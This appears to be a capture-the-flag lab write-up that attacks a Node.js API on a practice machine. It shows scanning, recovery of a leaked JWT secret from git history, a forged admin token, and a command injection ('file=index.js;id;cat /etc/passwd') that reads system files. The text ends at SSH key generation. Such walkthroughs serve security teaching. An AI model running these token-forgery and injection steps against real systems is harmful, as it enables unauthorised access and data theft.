### System scan
```
┌──(kali㉿kali)-[~/nmapAutomator]
└─$ ./nmapAutomator.sh -H 10.10.11.120 -t Port

Running a Port scan on 10.10.11.120

Host is likely running Linux


---------------------Starting Port Scan-----------------------



PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http



---------------------Finished all scans------------------------
                                                                             

Completed in 46 seconds
                                                  
```

```
┌──(kali㉿kali)-[~/nmapAutomator]
└─$ ./nmapAutomator.sh -H 10.10.11.120 -t Vulns                                                                                                                                                                                       130 ⨯

Running a Vulns scan on 10.10.11.120

Host is likely running Linux


---------------------Starting Vulns Scan-----------------------

Running CVE scan on common ports



PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:8.2p1: 
|       C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3    6.8     https://vulners.com/githubexploit/C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3  *EXPLOIT*
|       10213DBE-F683-58BB-B6D3-353173626207    6.8     https://vulners.com/githubexploit/10213DBE-F683-58BB-B6D3-353173626207  *EXPLOIT*
|       MSF:ILITIES/GENTOO-LINUX-CVE-2021-28041/        4.6     https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2021-28041/ *EXPLOIT*
|       MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/     4.3     https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/      *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/       *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/       *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/       *EXPLOIT*
|_      MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/   4.3     https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/    *EXPLOIT*
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
### Nginx Enumeration
- Having seen that port 80 is running nginx, we can further enumerate it to find out what we can find and what directories are available.
- For this,we can use `gobuster` with the wordlist being `/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt`

```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.120
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/02/12 15:51:56 Starting gobuster in directory enumeration mode
===============================================================

/download             (Status: 301) [Size: 183] [--> /download/]

/docs                 (Status: 200) [Size: 20720]               

/assets               (Status: 301) [Size: 179] [--> /assets/]  

/api                  (Status: 200) [Size: 93]                  

/Docs                 (Status: 200) [Size: 20720]               

/API                  (Status: 200) [Size: 93]                  

/DOCS                 (Status: 200) [Size: 20720]               

```
- The above endpoints can be found.
- Go through the `api` endpoint to see if we can find anything juicy and if infact it is a working endpoint.
- Heading over to `http://10.10.11.120/api/priv` and we get an `access denied` result.
- Download the pages using `wget -m http://10.10.11.120/`.

- We can check `/routes/auth.js` where we can see there is the `/register` endpoint to register users by sending a `POST` request as `GET` requests are not allowed.

```
┌──(kali㉿kali)-[~/…/web/10.10.11.120/download/local-web]
└─$ curl -X POST -H 'Content-Type: application/json' -v http://10.10.11.120/api/user/register --data '{"foo": "bar"}'
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 10.10.11.120:80...
* Connected to 10.10.11.120 (10.10.11.120) port 80 (#0)
> POST /api/user/register HTTP/1.1
> Host: 10.10.11.120
> User-Agent: curl/7.81.0
> Accept: */*
> Content-Type: application/json
> Content-Length: 14
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 400 Bad Request
< Server: nginx/1.18.0 (Ubuntu)
< Date: Tue, 15 Feb 2022 17:51:27 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 18
< Connection: keep-alive
< X-Powered-By: Express
< ETag: W/"12-FCVaNPnXYf0hIGYsTUTYByRq5/U"
< 
* Connection #0 to host 10.10.11.120 left intact
"name" is required                    
```
- We have a valid endpoint!!!.... The endpoint expects us to send data in order to register a user.
- The order of registering can be seen in the `validation.js` file ie name, email, password in order
```js
const Joi = require('@hapi/joi')


// register validation 

const registerValidation = data =>{
    const schema = {
        name: Joi.string().min(6).required(),
        email: Joi.string().min(6).required().email(),
        password: Joi.string().min(6).required()
    };

    return Joi.validate(data, schema)
}

// login validation

const loginValidation = data => {
    const schema2 = {
        email: Joi.string().min(6).required().email(),
        password: Joi.string().min(6).required()
    };

    return Joi.validate(data, schema2)
}


module.exports.registerValidation = registerValidation
module.exports.loginValidation = loginValidation
```

- From this we know how registration and login happens for a user and upon login a JWT token is produced.
```
const token = jwt.sign({ _id: user.id, name: user.name , email: user.email}, process.env.TOKEN_SECRET )
    res.header('auth-token', token).send(token);
```
- TThe user is verified using the jwt token produced via the `verifytoken.js`:
```
const jwt = require("jsonwebtoken");

module.exports = function (req, res, next) {
    const token = req.header("auth-token");
    if (!token) return res.status(401).send("Access Denied");

    try {
        const verified = jwt.verify(token, process.env.TOKEN_SECRET);
        req.user = verified;
        next();
    } catch (err) {
        res.status(400).send("Invalid Token");
    }
};
```

- We can register a user `brianbrian` from the knowledge above:
```
┌──(kali㉿kali)-[~/…/web/10.10.11.120/download/local-web]
└─$ curl -X POST -H 'Content-Type: application/json' -v http://10.10.11.120/api/user/register --data '{"name":"brianbrian", "email": "brian@brian.com", "password":"brianbrian"}'
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 10.10.11.120:80...
* Connected to 10.10.11.120 (10.10.11.120) port 80 (#0)
> POST /api/user/register HTTP/1.1
> Host: 10.10.11.120
> User-Agent: curl/7.81.0
> Accept: */*
> Content-Type: application/json
> Content-Length: 74
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
< Date: Tue, 15 Feb 2022 18:32:18 GMT
< Content-Type: application/json; charset=utf-8
< Content-Length: 21
< Connection: keep-alive
< X-Powered-By: Express
< ETag: W/"15-Rvpkf/iaKzMwJAN79g4Z5GNPicI"
< 
* Connection #0 to host 10.10.11.120 left intact
{"user":"brianbrian"}
```
- We have registered `brianbrian` as a user successfully and now we can try and login.
```
┌──(kali㉿kali)-[~/…/web/10.10.11.120/download/local-web]
└─$ curl -X POST -H 'Content-Type: application/json' -v http://10.10.11.120/api/user/login --data '{"email": "brian@brian.com", "password":"brianbrian"}'
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 10.10.11.120:80...
* Connected to 10.10.11.120 (10.10.11.120) port 80 (#0)
> POST /api/user/login HTTP/1.1
> Host: 10.10.11.120
> User-Agent: curl/7.81.0
> Accept: */*
> Content-Type: application/json
> Content-Length: 53
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
< Date: Tue, 15 Feb 2022 18:38:34 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 211
< Connection: keep-alive
< X-Powered-By: Express
< auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjBiZjFiMjEwM2JiZjA0NjExNWI1NzAiLCJuYW1lIjoiYnJpYW5icmlhbiIsImVtYWlsIjoiYnJpYW5AYnJpYW4uY29tIiwiaWF0IjoxNjQ0OTUwMzE0fQ.IfwscmXmuxE8Mf4RaT9fnBmibAHnVjqRGafTtBOumvs
< ETag: W/"d3-JaAqkZ5yhKfHSUyutWN9j4G4uCo"
< 
* Connection #0 to host 10.10.11.120 left intact
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjBiZjFiMjEwM2JiZjA0NjExNWI1NzAiLCJuYW1lIjoiYnJpYW5icmlhbiIsImVtYWlsIjoiYnJpYW5AYnJpYW4uY29tIiwiaWF0IjoxNjQ0OTUwMzE0fQ.IfwscmXmuxE8Mf4RaT9fnBmibAHnVjqRGafTtBOumvs        
```
- We now have a successful login and have our jwt token, but how does the site validate a JWT token?

```
const jwt = require("jsonwebtoken");

module.exports = function (req, res, next) {
    const token = req.header("auth-token");
    if (!token) return res.status(401).send("Access Denied");

    try {
        const verified = jwt.verify(token, process.env.TOKEN_SECRET);
        req.user = verified;
        next();
    } catch (err) {
        res.status(400).send("Invalid Token");
    }
};
```
- We just have to pass it as a header in request, and this can be confirmed by 
```
┌──(kali㉿kali)-[~/…/web/10.10.11.120/download/local-web]
└─$ curl  http://10.10.11.120/api/priv -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjBiZjFiMjEwM2JiZjA0NjExNWI1NzAiLCJuYW1lIjoiYnJpYW5icmlhbiIsImVtYWlsIjoiYnJpYW5AYnJpYW4uY29tIiwiaWF0IjoxNjQ0OTUwMzE0fQ.IfwscmXmuxE8Mf4RaT9fnBmibAHnVjqRGafTtBOumvs"                                                               
{"role":{"role":"you are normal user","desc":"brianbrian"}}    
```
- We can bypass the JWT validation by either changing the `alg` on [jwt.io](https://jwt.io/), hijackiing another user or Brute forcing the key.
- For the first option, changing the `alg`, there isn't an alg specified. As for hijacking another user's JWT, we are not able to see if there is any other user within the system.
- Going back to the source code files, there was a file `.env` that contained a `TOKEN_SECRET = secret`, we could use this to verify the signature on `jwt.io`
![](jwt1.png)
- The token is now a valid token to use, however, the token is still invalid meaning that the `TOKEN_SECRET` is wrong when we use it.
- We can as well check `git log` on the source code with an interesting commit.
![](git_logs.png)
- On the logs, we can see the `Token_secret` that was there.
![](token.png)
- Place the token on the verify signature in JWT then change the name to `theadmin` and use this token against  `/api/priv` which runs successfully.
```
┌──(kali㉿kali)-[~/…/web/10.10.11.120/download/local-web]
└─$ curl  http://10.10.11.120/api/priv -H "auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjBiZjFiMjEwM2JiZjA0NjExNWI1NzAiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImJyaWFuQGJyaWFuLmNvbSIsImlhdCI6MTY0NDk1MDMxNH0.jjwN-QWO9hIjJSYVTsm3H3Pg-6lOWTN1c9bdqD-ekj0" 
{"creds":{"role":"admin","username":"theadmin","desc":"welcome back admin"}}                                                                   
```
### Obtain a Foothold
- Now that we successfully have the admin account in place, we can leverage the various endpoints to gain access to the server.
- We can try grabbing the list of users from `/etc/passwd`.
```
┌──(kali㉿kali)-[~/…/web/10.10.11.120/download/local-web]
└─$ curl -i 'http://10.10.11.120/api/logs?file=index.js;id;cat+/etc/passwd' -H "auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjBiZjFiMjEwM2JiZjA0NjExNWI1NzAiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImJyaWFuQGJyaWFuLmNvbSIsImlhdCI6MTY0NDk1MDMxNH0.jjwN-QWO9hIjJSYVTsm3H3Pg-6lOWTN1c9bdqD-ekj0" | sed 's/\\n/\n/g' 
```
- This gives a successful shell, therefore we can create a reverse shell that can be used to start enumeration. When starting we had an SSH port open so we can use it on the system since it is running. We can generate a public key for this box.
![](images/ssh_keygen.png)
- The above command creates a new SSH public and private key in the directory named `10.10.11.120`
